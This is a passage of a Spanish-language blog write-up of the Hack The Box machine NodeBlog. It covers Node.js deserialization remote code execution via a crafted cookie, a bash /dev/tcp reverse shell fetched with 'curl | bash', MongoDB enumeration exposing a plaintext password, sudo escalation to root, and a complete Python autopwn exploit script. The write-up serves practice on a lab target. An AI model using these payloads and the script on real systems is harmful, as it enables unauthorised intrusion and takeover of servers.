+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.10.11.139 - - [13/Feb/2023 17:31:02] "GET / HTTP/1.1" 200 -
+</code></pre></div></div>
+<p>Tenemos una petición get del servidor web. Ahora el siguiente paso es ganar acceso a la máquina, en este caso haremos la misma petición get pero tendremos un recurso llamado index.html que contendrá lo siguiente:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
+bash <span class="nt">-i</span> <span class="o">&gt;</span>&amp; /dev/tcp/10.10.14.17/1235 0&gt;&amp;1
+</code></pre></div></div>
+<p>Luego, esa información que obtenga de la petición, haremos que la ejecute con bash mientras esperamos una conexión con netcat por el puerto 1235:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>{"rce":"_$$ND_FUNC$$_function (){ require('child_process').exec('curl 10.10.14.17 | bash', function(error, stdout, stderr) { console.log(stdout) });}()"}
+</code></pre></div></div>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.10.11.139 - - [13/Feb/2023 17:36:48] "GET / HTTP/1.1" 200 -
+</code></pre></div></div>
+
+<p>Y si vemos el netcat:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc -nvlp 1235
+listening on [any] 1235 ...
+connect to [10.10.14.17] from (UNKNOWN) [10.10.11.139] 54948
+bash: cannot set terminal process group (863): Inappropriate ioctl for device
+bash: no job control in this shell
+To run a command as administrator (user "root"), use "sudo &lt;command&gt;".
+See "man sudo_root" for details.
+
+bash: /home/admin/.bashrc: Permission denied
+admin@nodeblog:/opt/blog$ whoami
+whoami
+admin
+</code></pre></div></div>
+<p>Entramos a la máquina como usuario admin.</p>
+
+<p>Si intentamos entrar al directorio de admin nos dice lo siguiente:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>admin@nodeblog:/home$ cd admin
+cd admin
+bash: cd: admin: Permission denied
+admin@nodeblog:/home$ ls -la
+ls -la
+total 16
+drwxr-xr-x 1 root  root   10 Dec 27  2021 .
+drwxr-xr-x 1 root  root  180 Dec 27  2021 ..
+drw-r--r-- 1 admin admin 220 Jan  3  2022 admin
+</code></pre></div></div>
+<p>No tenemos permisos de atravesar esa carpeta, sin embargo, somos el dueño asi que lo cambiaremos con <code class="language-plaintext highlighter-rouge">chmod</code>:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>admin@nodeblog:/home$ chmod u+x admin
+chmod u+x admin
+admin@nodeblog:/home$ cd admin
+cd admin
+</code></pre></div></div>
+<p>Dentro del directorio buscamos la flag:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>admin@nodeblog:~$ cat user.txt
+cat user.txt
+14f76e48c30e6a58a819a1
+</code></pre></div></div>
+
+<p>¡Bien!, tenemos la flag de usuario.</p>
+
+<p>Si intentamos entrar a root:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>admin@nodeblog:~$ cd /root/
+cd /root/
+bash: cd: /root/: Permission denied
+</code></pre></div></div>
+<p>Asi que tendremos que escalar.</p>
+
+<h2 id="escalada-de-privilegios">
+<a href="#header-2"></a>Escalada de privilegios</h2>
+
+<p>Necesitamos una consola decente asi que se ejecutan los siguientes comandos:</p>
+
+<ul>
+  <li>script /dev/null -c bash</li>
+  <li>(ctrl + z)</li>
+  <li>stty raw -echo; fg</li>
+  <li>reset xterm</li>
+  <li>export TERM=xterm</li>
+  <li>export SHELL=bash</li>
+</ul>
+
+<p>De esta forma tenemos una consolta totalmente funcional.</p>
+
+<p>Intentamos ver los privilegios que tenemos:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>admin@nodeblog:~$ sudo -l
+[sudo] password for admin: 
+</code></pre></div></div>
+<p>Pero no tenemos la contraseña.</p>
+
+<p>Si listamos tareas cron no encontramos nada interesante:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>admin@nodeblog:~$ cat /cron/tab
+cat: /cron/tab: No such file or directory
+admin@nodeblog:~/.ssh$ cat /etc/crontab
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# Example of job definition:
+# .---------------- minute (0 - 59)
+# |  .------------- hour (0 - 23)
+# |  |  .---------- day of month (1 - 31)
+# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
+# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
+# |  |  |  |  |
+# *  *  *  *  * user-name command to be executed
+17 *    * * *   root    cd / &amp;&amp; run-parts --report /etc/cron.hourly
+25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.daily )
+47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.weekly )
+52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.monthly )
+#
+</code></pre></div></div>
+
+<p>Si buscamos permisos SUID:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>admin@nodeblog:~$ find \-perm -4000 2&gt;/dev/null
+</code></pre></div></div>
+<p>Tampoco encontramos nada.</p>
+
+<p>Si buscamos por los servicios que se están ejecutando en la máquina:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dmin@nodeblog:~$ netstat -nat
+Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State      
+tcp        0      0 127.0.0.1:27017         0.0.0.0:*               LISTEN     
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN     
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN     
+tcp        0    138 10.10.11.139:54948      10.10.14.17:1235        ESTABLISHED
+tcp        0      0 127.0.0.1:27017         127.0.0.1:59240         ESTABLISHED
+tcp        0      0 127.0.0.1:27017         127.0.0.1:59244         ESTABLISHED
+tcp        0      0 127.0.0.1:27017         127.0.0.1:59242         ESTABLISHED
+tcp        0      0 127.0.0.1:59240         127.0.0.1:27017         ESTABLISHED
+tcp        0      0 127.0.0.1:59244         127.0.0.1:27017         ESTABLISHED
+tcp        0      0 127.0.0.1:59242         127.0.0.1:27017         ESTABLISHED
+tcp6       0      0 :::5000                 :::*                    LISTEN     
+tcp6       0      0 :::22                   :::*                    LISTEN 
+</code></pre></div></div>
+<p>Si nos fijamos bien está el puerto <strong>27017</strong>, si recordamos hicimos una injección noSQL, y este puerto normalmente se utiliza para <strong>Mongo</strong>, vamos a husmear por las bases de datos a ver si encontramos algo.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>admin@nodeblog:~$ mongo
+MongoDB shell version v3.6.8
+connecting to: mongodb://127.0.0.1:27017
+Implicit session: session { "id" : UUID("5846f80d-3e2b-4daf-91aa-b605bd155d54") }
+MongoDB server version: 3.6.8
+Server has startup warnings: 
+2023-02-13T12:05:01.400+0000 I CONTROL  [initandlisten] 
+2023-02-13T12:05:01.400+0000 I CONTROL  [initandlisten] ** WARNING: Access control is not enabled for the database.
+2023-02-13T12:05:01.400+0000 I CONTROL  [initandlisten] **          Read and write access to data and configuration is unrestricted.
+2023-02-13T12:05:01.400+0000 I CONTROL  [initandlisten] 
+</code></pre></div></div>
+
+<p>Utilizamos el comando help para ver los diferentes comandos que podemos utilizar, en este caso usaremos <strong>show dbs</strong>:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>show dbs
+admin   0.000GB
+blog    0.000GB
+config  0.000GB
+local   0.000GB
+</code></pre></div></div>
+<p>Buscaremos en admin:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>use admin
+switched to db admin
+</code></pre></div></div>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>show collections
+system.sessions
+</code></pre></div></div>
+
+<p>Pero no encontramos nada.</p>
+
+<p>Usamos blog:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> use blog
+switched to db blog
+ show collections
+articles
+users
+</code></pre></div></div>
+
+<p>Encontramos users, asi que buscaremos si hay información allí.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>db.users.find()
+{ "_id" : ObjectId("61b7380ae5814df6030d2373"), "createdAt" : ISODate("2021-12-13T12:09:46.009Z"), "username" : "admin", "password" : "IppsecSaysPleaseSubscribe", "__v" : 0 }
+</code></pre></div></div>
+<p>Encontramos lo que parece ser la contraseña del usuario admin, vamos a probarla:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>admin@nodeblog:~$ sudo -l
+[sudo] password for admin: 
+Matching Defaults entries for admin on nodeblog:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User admin may run the following commands on nodeblog:
+    (ALL) ALL
+    (ALL : ALL) ALL
+</code></pre></div></div>
+
+<p>Si corresponde a su contraseña, podemos ver que podemos utilizar cualquier comando como root, somos sudoes así que estamos listos:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>admin@nodeblog:~$ sudo bash
+root@nodeblog:/home/admin# whoami
+root
+root@nodeblog:/home/admin# cd /root
+root@nodeblog:~# cat root.txt
+dacc9bd5f9edbacb1c4fd9b
+root@nodeblog:~# 
+</code></pre></div></div>
+
+<p>¡Bien!</p>
+
+<p>Hemos ganado acceso como administrador.</p>
+
+<p>Como un extra vamos a realizar la automatización de la intrusión a la máquina.</p>
+
+<p>Vamos a utilizar las siguientes librerías:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">requests</span><span class="p">,</span><span class="n">sys</span><span class="p">,</span><span class="n">base64</span>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">from</span> <span class="nn">os</span> <span class="kn">import</span> <span class="n">system</span>
+</code></pre></div></div>
+
+<p>Definimos nuestras variables:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Host_ip</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+<span class="n">Target_ip</span> <span class="o">=</span> <span class="s">'http://10.10.11.139:5000'</span>
+<span class="n">s</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">Session</span><span class="p">()</span>
+</code></pre></div></div>
+<p>Luego, tenemos la siguiente función que se encarga de hacer un url encode completo al string:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">encode_all</span><span class="p">(</span><span class="n">string</span><span class="p">):</span>
+    <span class="k">return</span> <span class="s">""</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="s">"%{0:0&gt;2}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="nb">format</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">char</span><span class="p">),</span> <span class="s">"x"</span><span class="p">))</span> <span class="k">for</span> <span class="n">char</span> <span class="ow">in</span> <span class="n">string</span><span class="p">)</span>
+</code></pre></div></div>
+<p>La siguiente función, es esta:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">unserialize_attack</span><span class="p">():</span>
+
+    <span class="n">reverse</span> <span class="o">=</span> <span class="sa">f</span><span class="s">'bash -i &gt;&amp; /dev/tcp/</span><span class="si">{</span><span class="n">Host_ip</span><span class="si">}</span><span class="s">/1234 0&gt;&amp;1'</span>
+    <span class="n">reverse_bytes</span> <span class="o">=</span> <span class="n">reverse</span><span class="p">.</span><span class="n">encode</span><span class="p">(</span><span class="s">"ascii"</span><span class="p">)</span>
+    <span class="n">base64_bytes</span> <span class="o">=</span> <span class="n">base64</span><span class="p">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">reverse_bytes</span><span class="p">)</span>
+    <span class="n">reversebase64</span> <span class="o">=</span> <span class="n">base64_bytes</span><span class="p">.</span><span class="n">decode</span><span class="p">(</span><span class="s">"ascii"</span><span class="p">)</span>
+
+    <span class="n">payload</span><span class="o">=</span> <span class="n">encode_all</span><span class="p">(</span><span class="s">"""{"rce":"_$$ND_FUNC$$_function (){ require('child_process').exec('echo %s| base64 -d | bash', function(error, stdout, stderr) { console.log(stdout) });}()"}"""</span> <span class="o">%</span> <span class="n">reversebase64</span><span class="p">)</span>
+    <span class="n">cookie</span> <span class="o">=</span> <span class="sa">f</span><span class="s">'auth =</span><span class="si">{</span><span class="n">payload</span><span class="si">}</span><span class="s">'</span> 
+    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="s">"Cookie"</span><span class="p">:</span> <span class="n">cookie</span>
+    <span class="p">}</span>   
+    <span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">Target_ip</span><span class="p">,</span><span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
+</code></pre></div></div>
+<p>La cual pasa a base64 la <strong>reverse shell</strong> y lo agrega al <strong>payload</strong>, el cual pasa a url enconde. Toda la data se envía en el header en la petición get.</p>
+
+<p>Finalmente, en el main:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="n">threading</span><span class="p">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">unserialize_attack</span><span class="p">,</span> <span class="n">args</span><span class="o">=</span><span class="p">()).</span><span class="n">start</span><span class="p">()</span>
+    <span class="n">shell</span> <span class="o">=</span> <span class="n">listen</span><span class="p">(</span><span class="mi">1234</span><span class="p">,</span><span class="n">timeout</span><span class="o">=</span><span class="mi">10</span><span class="p">).</span><span class="n">wait_for_connection</span><span class="p">()</span>
+    <span class="n">shell</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div></div>
+
+<p>Tenemos la llamada a la función <strong>unserialize_attack</strong> mientras estamos escuchando por el puerto 1234 la conexión.</p>
+
+<p>El código completo es el siguiente:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">requests</span><span class="p">,</span><span class="n">sys</span><span class="p">,</span><span class="n">base64</span>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">from</span> <span class="nn">os</span> <span class="kn">import</span> <span class="n">system</span>
+
+<span class="k">def</span> <span class="nf">def_handler</span><span class="p">(</span><span class="n">sig</span><span class="p">,</span> <span class="n">frame</span><span class="p">):</span>
+    <span class="k">print</span><span class="p">(</span><span class="s">"</span><span class="se">\n\n</span><span class="s">[!] saliendo...</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+    <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+
+<span class="n">signal</span><span class="p">.</span><span class="n">signal</span><span class="p">(</span><span class="n">signal</span><span class="p">.</span><span class="n">SIGINT</span><span class="p">,</span> <span class="n">def_handler</span><span class="p">)</span>
+
+<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">:</span>
+    <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">'[!] Uso: python3 </span><span class="si">{</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="si">}</span><span class="s"> "Tu IP"</span><span class="se">\n</span><span class="s">'</span> <span class="p">)</span>
+    <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+
+<span class="n">Host_ip</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+<span class="n">Target_ip</span> <span class="o">=</span> <span class="s">'http://10.10.11.139:5000'</span>
+<span class="n">s</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">Session</span><span class="p">()</span>
+
+
+<span class="k">def</span> <span class="nf">encode_all</span><span class="p">(</span><span class="n">string</span><span class="p">):</span>
+    <span class="k">return</span> <span class="s">""</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="s">"%{0:0&gt;2}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="nb">format</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">char</span><span class="p">),</span> <span class="s">"x"</span><span class="p">))</span> <span class="k">for</span> <span class="n">char</span> <span class="ow">in</span> <span class="n">string</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">unserialize_attack</span><span class="p">():</span>
+
+    <span class="n">reverse</span> <span class="o">=</span> <span class="sa">f</span><span class="s">'bash -i &gt;&amp; /dev/tcp/</span><span class="si">{</span><span class="n">Host_ip</span><span class="si">}</span><span class="s">/1234 0&gt;&amp;1'</span>
+    <span class="n">reverse_bytes</span> <span class="o">=</span> <span class="n">reverse</span><span class="p">.</span><span class="n">encode</span><span class="p">(</span><span class="s">"ascii"</span><span class="p">)</span>
+    <span class="n">base64_bytes</span> <span class="o">=</span> <span class="n">base64</span><span class="p">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">reverse_bytes</span><span class="p">)</span>
+    <span class="n">reversebase64</span> <span class="o">=</span> <span class="n">base64_bytes</span><span class="p">.</span><span class="n">decode</span><span class="p">(</span><span class="s">"ascii"</span><span class="p">)</span>
+
+    <span class="n">payload</span><span class="o">=</span> <span class="n">encode_all</span><span class="p">(</span><span class="s">"""{"rce":"_$$ND_FUNC$$_function (){ require('child_process').exec('echo %s| base64 -d | bash', function(error, stdout, stderr) { console.log(stdout) });}()"}"""</span> <span class="o">%</span> <span class="n">reversebase64</span><span class="p">)</span>
+    <span class="n">cookie</span> <span class="o">=</span> <span class="sa">f</span><span class="s">'auth =</span><span class="si">{</span><span class="n">payload</span><span class="si">}</span><span class="s">'</span> 
+    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="s">"Cookie"</span><span class="p">:</span> <span class="n">cookie</span>
+    <span class="p">}</span>   
+    <span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">Target_ip</span><span class="p">,</span><span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
+    
+    <span class="n">threading</span><span class="p">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">unserialize_attack</span><span class="p">,</span> <span class="n">args</span><span class="o">=</span><span class="p">()).</span><span class="n">start</span><span class="p">()</span>
+    <span class="n">shell</span> <span class="o">=</span> <span class="n">listen</span><span class="p">(</span><span class="mi">1234</span><span class="p">,</span><span class="n">timeout</span><span class="o">=</span><span class="mi">10</span><span class="p">).</span><span class="n">wait_for_connection</span><span class="p">()</span>
+    <span class="n">shell</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div></div>
+
+<p>Si lo ejecutamos:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 AutopwnNodeBlog.py 10.10.14.17
+[+] Trying to bind to :: on port 1234: Done
+[+] Waiting for connections on :::1234: Got connection from ::ffff:10.10.11.139 on port 59108
+[*] Switching to interactive mode
+bash: cannot set terminal process group (863): Inappropriate ioctl for device
+bash: no job control in this shell
+admin@nodeblog:/opt/blog$ $ whoami
+whoami
+admin 
+</code></pre></div></div>
+<p>¡Listo! Hemos automatizado la intrusión.</p>
+
+<p>Nos vemos, hasta la próxima.</p>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/tags/#autopwn" class="page__taxonomy-item" rel="tag">Autopwn</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#deserialized-attack" class="page__taxonomy-item" rel="tag">Deserialized attack</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#enumeration" class="page__taxonomy-item" rel="tag">Enumeration</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#linux" class="page__taxonomy-item" rel="tag">Linux</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#mongo" class="page__taxonomy-item" rel="tag">Mongo</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#nosqli" class="page__taxonomy-item" rel="tag">noSQLI</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#web" class="page__taxonomy-item" rel="tag">Web</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#xxe" class="page__taxonomy-item" rel="tag">XXE</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categories/#easy" class="page__taxonomy-item" rel="tag">Easy</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/categories/#hack-the-box" class="page__taxonomy-item" rel="tag">Hack The Box</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/categories/#linux" class="page__taxonomy-item" rel="tag">Linux</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/categories/#write-up" class="page__taxonomy-item" rel="tag">Write up</a>
+    
+    </span>
+  </p>
+
+
+        
+          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Fecha:</strong> <time datetime="2023-02-11T00:00:00-05:00">February 11, 2023</time></p>
+        
+      </footer>
+
+      
+
+      
+  <nav class="pagination">
+    
+      <a href="/Love/" class="pagination--pager" title="Love HTB Write-up
+">Previous</a>
+    
+    
+      <a href="/Nunchucks/" class="pagination--pager" title="NunChucks HTB Write-up
+">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+</div>
+
+    </div>
+
+    
+
+    <div class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+
+    
+
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+  </ul>
+</div>
+
+<div class="page__footer-copyright">© 2023 grafis</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script data-search-pseudo-elements defer src="https://use.fontawesome.com/releases/v5.7.1/js/all.js" integrity="sha384-eVEQC9zshBn0rFj4+TU78eNA19HMNigMviK/PU/FFjLXqa/GKPgX58rvt5Z8PLs7" crossorigin="anonymous"></script>
+
+
+
+
+
+
+
+
+  </body>
+</html>
